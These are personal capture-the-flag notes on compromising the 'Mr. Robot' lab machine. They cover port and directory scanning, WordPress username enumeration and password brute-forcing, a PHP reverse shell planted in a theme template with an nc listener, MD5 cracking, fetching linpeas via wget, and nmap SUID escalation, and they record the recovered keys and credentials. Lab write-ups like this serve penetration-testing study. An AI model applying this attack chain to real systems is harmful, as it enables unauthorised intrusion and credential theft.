
ip = 192.168.1.13
first running port scan on the target
# nmap 
open ports : 80,443,22
22/tcp  closed ssh      conn-refused
80/tcp  open   http     syn-ack      Apache httpd
443/tcp open   ssl/http syn-ack      Apache httpd
# Port 80 http
we get a web shell on the website
http://192.168.1.13/prepare
 http://192.168.1.13/fsociety
 http://192.168.1.13/inform
 http://192.168.1.13/question
 http://192.168.1.13/wakeup
 http://192.168.1.13/join
# gobuster
website is running on wordpress
![[Pasted image 20211203170611.png]]
found robots.txt
fsocity.dic
key-1-of-3.txt
![[Pasted image 20211203171152.png]]
![[Pasted image 20211203171203.png]]

First KEY= 073403c8a58a1f80d943455fb30724b9

![[Pasted image 20211203171311.png]]

found /phpmyadmin but only accessible by local host
![[Pasted image 20211203171434.png]]

after looking here and there for a while i decided to look into using 
downloaded fsocity.dic file seems like it's a dictionary of passwords but has duplicates
we can sort fsocity.dic | uniq > newfsocity.dic
and leave it for now

# wpscan 
wp scan --url mrrobot.vuln -e u 
and we got something interesting 
![[Pasted image 20211203174042.png]]
XML-RPC enabled 
 WordPress version 4.3.1
# enumerating wordpress login
tried root admin superuser administrator but always same error 
![[Pasted image 20211203181422.png]]
tried the series main characters 
mrrobot
mr.robot
elliot 
![[Pasted image 20211203181502.png]]
and we get a hit
 now we can try to brute force the password with the file we downloaded earlier from robots.txt
 using wpscan
 wpscan --url mrrobot.vuln -U elliot -P ~/Downloads/newfsocity.dic
 and we have [[00 Progress/Boxes/VulHub/Linux/mrRobot/04 Creds]]
 ![[Pasted image 20211203181631.png]]
 
 ![[Pasted image 20211203181734.png]]
we are in wordpress now
we can try to upload a reverse shell into plugins or templates
let's do themes templates 
first we open appearance and use the editor 
![[Pasted image 20211203183416.png]]
now let's get our php-reverse-shell 
![[Pasted image 20211203183449.png]]
and use 404.php template and delete it's content and add our reverse shell
![[Pasted image 20211203183516.png]]
let's open  our listener on 4444
nc -lvnp 4444
and we try to access the page
![[Pasted image 20211203183538.png]]
mrrobot.vuln/wp-content/themes/twentythirteen/404.php
![[Pasted image 20211203183606.png]]
and we are in!

let's start with getting stable shell
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm
looking into home we find a directory called robot
![[Pasted image 20211203183931.png]]
we can access the password.raw-md5 file 
which probably contains the password for robot 
robot:c3fcd3d76192e4007dfb496cca67e13b
let's try to crack it with hashcat
hashcat -m 0 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt 
![[Pasted image 20211203184759.png]]
su robot 
abcdefghijklmnopqrstuvwxyz
![[Pasted image 20211203184909.png]]

Second KEY  = 822c73956184f694993bede3eb39f959
![[Pasted image 20211203184934.png]]


let's run linpeas
python -m http.server
wget 192.168.1.7:8000/linpeas.sh linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
Linux version 3.13.0-55-generic
gcc version 4.8.2
Sudo version 1.8.9p5
![[Pasted image 20211203190511.png]]
![[Pasted image 20211203190923.png]]
nmap has setuid?
looking around in how to use nmap with suid
https://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes--LINUX_-_Privilege_Escalation--LINUX_-_SUID_-_NMAP.html
![[Pasted image 20211203192146.png]]
![[Pasted image 20211203192246.png]]
Third KEY  = 04787ddef27c3dee1ee161b21670b4e4

# Found Creds

| Service   | Username | password |
| --------- | -------- | -------------------------- |
| wordpress | elliot   | ER28-0652                  |
| user      | robot    | abcdefghijklmnopqrstuvwxyz |

# Conclusion
- Word was vulnerable to Password Brute forcing 
- Wordpress was vulnerable to  uploading reverse shell to the Themes templates
- stored password in home directory lead to compromising higher privileged user in the system
- having setuid on Binary file that lead to privilege escalation to root   
